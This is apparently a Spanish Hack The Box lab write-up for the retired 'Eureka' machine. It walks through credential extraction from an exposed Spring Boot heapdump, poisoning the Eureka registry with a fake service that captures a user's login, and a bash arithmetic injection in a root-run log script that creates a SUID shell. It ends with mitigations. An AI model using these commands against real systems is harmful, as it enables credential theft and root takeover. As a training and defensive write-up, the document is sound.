---
machine: Eureka
os: Linux
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [linux, spring-boot, actuator, heapdump, eureka, spring-cloud-gateway, mitm, arithmetic-injection, privesc]
---

# Eureka — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

El sitio `furni.htb` es Spring Boot y expone `/actuator/heapdump`. El volcado de memoria contiene credenciales de `oscar190`, que dan acceso SSH. Los archivos de configuración de los microservicios revelan el gateway en `8080`, el servicio de usuarios en `8081`, la web en `8082` y Eureka en `8761`. Con las credenciales de Eureka se registra un servicio falso llamado `USER-MANAGEMENT-SERVICE` que apunta a un servidor propio; el gateway balancea las peticiones hacia él y captura el login de `miranda-wise`, incluida su contraseña. Ya como `miranda-wise`, se escribe una línea en el log que consume `/opt/log_analyse.sh`, ejecutado por root: la comparación aritmética de bash evalúa la expresión inyectada y crea una bash SUID.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80,8761 <IP>
```

- `22`: OpenSSH 8.2p1 Ubuntu.
- `80`: nginx con Spring Boot.
- `8761`: panel de Eureka.

```bash
echo '<IP> furni.htb' | sudo tee -a /etc/hosts
feroxbuster -u http://furni.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

## Enumeración

`/actuator` está expuesto y `/actuator/heapdump` descarga un volcado de unos 80 MB. Se analiza con VisualVM o `jdumpspider`; entre las cadenas aparecen credenciales de los servicios:

```bash
curl -o heapdump http://furni.htb/actuator/heapdump
# abrir el volcado con VisualVM o jdumpspider y buscar cadenas
```

El volcado contiene la contraseña de `oscar190`, que funciona por SSH. Su home y `/opt` muestran la estructura de la aplicación; nginx revela los backends:

```text
8080  spring-cloud-gateway (interno)
8081  user-management-service
8082  furni
8761  Eureka
```

Los `application.yaml` de `/var/www/web` contienen las credenciales de Eureka y las rutas del gateway (`lb://USER-MANAGEMENT-SERVICE`).

## Foothold

Con `oscar190` por SSH se leen los archivos de configuración y se confirma que el gateway resuelve el servicio de usuarios por nombre en Eureka. Eureka permite registrar instancias por API:

```bash
curl -u 'EurekaSrvr:<PASSWORD>' -X POST \
  -H 'Content-Type: application/json' \
  http://127.0.0.1:8761/eureka/apps/USER-MANAGEMENT-SERVICE \
  -d '{"instance":{"hostName":"<LHOST>","app":"USER-MANAGEMENT-SERVICE","port":{"$":8081,"@enabled":"true"},"status":"UP"}}'
```

Se levanta un servidor en `8081` que responde a `/login`. Cuando `miranda-wise` inicia sesión cada pocos minutos, el gateway envía la petición al servicio falso y se captura el formulario con su contraseña.

## Movimiento lateral

La contraseña capturada funciona por SSH para `miranda-wise`, que puede leer `user.txt` y revisar los scripts de la aplicación.

```bash
ssh miranda-wise@furni.htb
```

## Escalada de privilegios

`/opt/log_analyse.sh` es legible y lo ejecuta un cron de root. El script compara el estado HTTP con `-eq`, lo que en bash evalúa ambos lados como expresiones aritméticas:

```bash
[[ "$status" -eq 200 ]]
```

`miranda-wise` puede escribir el log que analiza:

```bash
echo 'HTTP Status: x[$(cp /bin/bash /tmp/rootbash; chmod 6777 /tmp/rootbash)]' \
  > /var/www/web/user-management-service/log/application.log
```

En la siguiente ejecución, `x[$(...)]` se evalúa como índice de array y ejecuta el comando como root:

```bash
/tmp/rootbash -p
```

## Evidencia

- `/actuator/heapdump` descargable y credenciales de `oscar190` en memoria.
- Configuración con Eureka, gateway y servicios internos.
- Instancia falsa registrada y login de `miranda-wise` capturado.
- SSH como `miranda-wise` y acceso de escritura al log.
- `log_analyse.sh` con `-eq` y bash SUID creada por el cron de root.

## Lecciones aprendidas

- Un heapdump expone secretos en claro aunque la aplicación no los muestre.
- Eureka sin autenticación fuerte permite envenenar el descubrimiento de servicios.
- El gateway confía en el registro y balancea hacia una instancia arbitraria.
- `[[ "$x" -eq ... ]]` evalúa aritmética y puede ejecutar comandos.
- Un log escribible consumido por root es una vía directa de escalada.

## Mitigaciones y detección

- Deshabilitar o autenticar `/actuator` y nunca exponer `heapdump`.
- Rotar credenciales y no dejarlas en memoria más de lo necesario.
- Autenticar y autorizar el registro en Eureka; validar host e IP.
- Usar comparaciones de cadenas (`=`) y sanear valores antes de `-eq`.
- Restringir la escritura de logs y ejecutar analizadores con un usuario sin privilegios.
- Alertar de registros de instancias nuevas y de procesos que crean SUID.

## Referencias

- [0xdf — Eureka](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [Hack The Box — Eureka](https://app.hackthebox.com/machines/eureka)
